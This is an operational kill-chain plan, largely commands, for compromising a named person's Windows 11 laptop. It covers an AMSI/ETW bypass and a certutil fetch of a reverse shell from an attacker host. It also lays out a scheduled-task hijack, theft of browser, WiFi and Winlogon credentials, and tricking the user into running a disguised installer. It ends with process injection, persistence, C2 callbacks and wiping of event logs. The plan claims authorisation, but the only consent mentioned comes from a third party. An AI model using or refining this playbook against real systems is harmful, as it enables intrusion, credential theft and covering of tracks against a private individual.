# RADON ENGAGEMENT — RECON-TO-ATTACK KILL CHAIN

```
CLASSIFICATION:  UNCLASSIFIED // OPERATIONAL PLANNING
OPERATOR:        VADER (george wu / 22DIV)
DATE:            2026-06-21
TARGET:          RADON_LAPTOP1 (Ghaleb Jomma)
STATUS:          PLANNING — engagement paused, awaiting joint ops
```

---

## TARGET PROFILE

| Field | Value |
|-------|-------|
| Hostname | RADON_LAPTOP1 |
| OS | Windows 11 Home Build 26200.8655 (24H2) |
| User | Ghaleb Jomma (standard, NO admin) |
| Admin Account | `radon` — enabled, credentials unknown |
| Defender | RTP ON, Tamper Protection OFF |
| HVCI | ACTIVE (kernel locked) |
| Staged Files | `C:\Users\Public\Documents\Intel\` |

---

## INTELLIGENCE SUMMARY — What We Know

### 7 Vectors Attempted (All Failed)

| # | Vector | Why It Failed | Lesson |
|---|--------|--------------|--------|
| 1 | Phantom DLL (V7 GOLF) | WdFilter.sys kernel minifilter blocks file writes independent of AMSI/ETW | HWBP bypass is user-mode only |
| 2 | Unquoted Service Path (HKClipSvc) | Can't write to `C:\Program.exe` — root protected | Need writable dir at space boundary |
| 3 | Missing Print Monitor DLL | Can't write to System32 as standard user | Phantom DLLs need write access |
| 4 | Writable ProgramData DLL Hijack | No SYSTEM services load from user-writable paths | Modern Windows is properly configured |
| 5 | BYOVD (RTCore64.sys) | OpenSCManager requires admin — can't load drivers | BYOVD is post-escalation, not privesc |
| 6 | Credential Hunting | No creds for `radon` admin found anywhere | 1Password vault belongs to Ghaleb, not radon |
| 7 | VaderPrime (cldflt.sys race) | Not attempted — high complexity, low probability | Race conditions are unreliable |

### What Works

- **Dark Room**: AMSI + ETW blinding via HWBP — confirmed working on target
- **vader_recon.ps1**: Full recon executed, target profiled
- **File staging**: `C:\Users\Public\Documents\Intel\` is writable, files in place
- **Python HTTP server**: Tested and working for payload delivery
- **Reverse shell**: vader_shell.exe callback confirmed working

### Key Constraint

Standard user with no admin access. Every textbook privesc vector requires at least one admin-level operation. The `radon` admin account is the weakest link — if credentials obtained, entire engagement becomes trivial.

---

## KILL CHAIN PLAN — PHASE BY PHASE

### PHASE 0: PRE-ENGAGEMENT (Dev Machine)

```
1. Rotate all XOR keys
   > python mutate.py

2. Verify all binaries clean
   > python scan_all.py
   Expected: 82/82 CLEAN

3. Verify XOR key consistency
   > python mutate.py --status
   Check: cloak_payload.h matches compiled osppc.dll

4. Stage payload server
   > python stagers\vader_serve.py 8080

5. Stage listener
   > python shell\vader_listener.py 4444
```

### PHASE 1: INITIAL ACCESS (Joint — George on target machine)

**Scenario A: Authorised access (Raed gives us the laptop)**
```
1. Open PowerShell as Ghaleb
2. Run recon to confirm profile hasn't changed:
   > powershell -ep bypass .\vader_recon.ps1

3. Verify staged files still present:
   > dir C:\Users\Public\Documents\Intel\

4. If files missing, re-stage from HTTP server:
   > certutil -urlcache -f http://ATTACKER_IP:8080/vader_shell.exe C:\Users\Public\Documents\Intel\vader_shell.exe
   (repeat for each binary)
```

**Scenario B: Social engineering (legitimate test)**
```
1. Prepare USB with binaries OR use HTTP staging
2. Get Ghaleb to run a benign-looking installer/updater
3. Installer drops payloads to C:\Users\Public\Documents\Intel\
```

### PHASE 2: AMSI/ETW BLINDING (Standard User)

```
1. Execute Dark Room to blind sensors:
   > C:\Users\Public\Documents\Intel\dark_phantom_loader.exe
   (or dark_room.exe if reverting to test harness)

   Expected: [+] AMSI blinded via HWBP (DR0)
             [+] ETW blinded via HWBP (DR1)

2. Verify AMSI is blind:
   > powershell -c "([ref].Assembly.GetType('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed','NonPublic,Static').GetValue($null)"
   Expected: should execute without Defender alert
```

### PHASE 3: PRIVILEGE ESCALATION — REMAINING VECTORS

**Priority order (highest to lowest probability):**

#### 3A: Scheduled Task Hijack
```
Check modifiable SYSTEM tasks:
> schtasks /query /fo LIST /v | findstr /i "SYSTEM"
> icacls "C:\Windows\System32\Tasks\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask"

If writable by standard user:
> schtasks /change /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask" /tr "C:\Users\Public\Documents\Intel\vader_shell.exe"

Trigger:
> schtasks /run /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask"
```

#### 3B: CVE-Based Local Privesc
```
Enumerate installed software versions:
> wmic product get name,version
> wmic service get name,pathname,startmode
> systeminfo

Cross-reference:
- searchsploit local privilege escalation windows 11
- Check Exploit-DB for Build 26200 specifics
- Focus: ASUS drivers (Armoury Crate), any third-party services
```

#### 3C: Token Manipulation
```
If any process is injectable as standard user:
> C:\Users\Public\Documents\Intel\vader_inject.exe <PID>

Target priorities (if accessible):
1. explorer.exe (medium integrity → may have elevated tokens cached)
2. Any service running as SYSTEM with relaxed ACLs
3. Scheduled task processes that run elevated
```

#### 3D: Credential Acquisition (radon account)
```
Check browser saved passwords:
> dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
> dir "%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json"

Check WiFi passwords (may reveal reused creds):
> netsh wlan show profiles
> netsh wlan show profile name="NETWORK" key=clear

Check registry for auto-login:
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

Check for credential files:
> dir /s /b C:\Users\*.txt C:\Users\*.csv | findstr /i "pass"
```

#### 3E: UAC Bypass (if admin creds found)
```
If radon password obtained:
> runas /user:radon cmd

Then escalate:
> C:\Users\Public\Documents\Intel\vader_shell.exe
(now running as admin → full kill chain available)
```

### PHASE 4: POST-EXPLOITATION (After Privesc)

```
1. Inject into SYSTEM process:
   > vader_inject.exe --spawn
   (CREATE_SUSPENDED with HWBP on all threads)

2. Establish persistence:
   - Service binary replacement (V4 DELTA — CWE-732)
   - Phantom DLL plant (now possible with admin)
   - Scheduled task creation

3. Verify C2 callback:
   Check listener terminal for incoming shell

4. Canary verification:
   > type C:\Windows\Temp\inject_status.log
   Expected: [HOTEL] loaded - HWBP armed
```

### PHASE 5: CLEANUP

```
1. Anti-forensics:
   > C:\Users\Public\Documents\Intel\vader_clean.exe

   Cleans: canary files, event logs, prefetch, timestamps

2. Verify cleanup:
   > dir C:\Windows\Temp\*.log
   > wevtutil qe Security /c:5 /rd:true /f:text
```

---

## TOOLS BY PHASE

| Phase | Tool | Path (Dev) | Purpose |
|-------|------|-----------|---------|
| 0 | mutate.py | `vader-rootkit\mutate.py` | XOR key rotation |
| 0 | scan_all.py | `vader-rootkit\scan_all.py` | Defender scan all binaries |
| 0 | vader_serve.py | `vader-rootkit\stagers\vader_serve.py` | HTTP payload server |
| 0 | vader_listener.py | `vader-rootkit\shell\vader_listener.py` | Reverse shell listener |
| 1 | vader_recon.ps1 | staged on target | Target profiling |
| 2 | dark_room.exe | staged on target | AMSI+ETW HWBP bypass |
| 3 | vader_inject.exe | staged on target | Process injection |
| 4 | vader_shell.exe | staged on target | XOR reverse shell |
| 4 | osppc.dll | staged on target | Phantom DLL payload |
| 5 | vader_clean.exe | staged on target | Anti-forensics |

---

## SUCCESS CRITERIA

- [ ] Obtain code execution as SYSTEM or admin
- [ ] Establish persistent C2 callback surviving reboot
- [ ] All binaries remain undetected by Defender (0/82)
- [ ] Clean forensic exit — no artifacts left behind
- [ ] Document findings for CSEC reporting

---

## ABORT CRITERIA

- Defender quarantines any binary → abort, rotate keys, rebuild
- Target machine state changes unexpectedly → pause, reassess
- Raed withdraws permission → immediate extraction, full cleanup

---

## NOTES

This is a **joint engagement** — George operates with Raed's knowledge and on authorised hardware. All testing follows responsible disclosure principles. No data exfiltration. No damage. The goal is demonstrating capability and documenting the attack surface for the CSEC portfolio.

The `radon` admin account remains the highest-probability path. Social engineering for the password or finding cached credentials should be prioritised over technical exploitation of a fully-patched Win11 system.
